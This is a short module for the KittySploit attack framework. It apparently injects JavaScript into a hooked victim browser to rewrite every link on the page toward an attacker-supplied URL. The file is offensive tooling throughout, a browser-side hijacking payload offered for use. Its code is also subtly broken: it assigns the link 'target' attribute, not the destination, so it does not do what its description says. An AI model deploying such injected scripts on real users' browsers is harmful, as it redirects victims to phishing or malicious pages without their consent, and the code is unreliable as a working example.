from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "replace links",
		"description": "Replace all links by your link",
		"browser": Browser.ALL,
		"platform": Platform.ALL
	}	
	
	link = OptString("https://kittysploit.com", "Your new link", "yes")

	def run(self):
		js = f"""
var links = document.links;
for (var i = 0; i < links.length; i++) {{
     links[i].target = "{self.link}";
}}"""
		self.send_js(js)
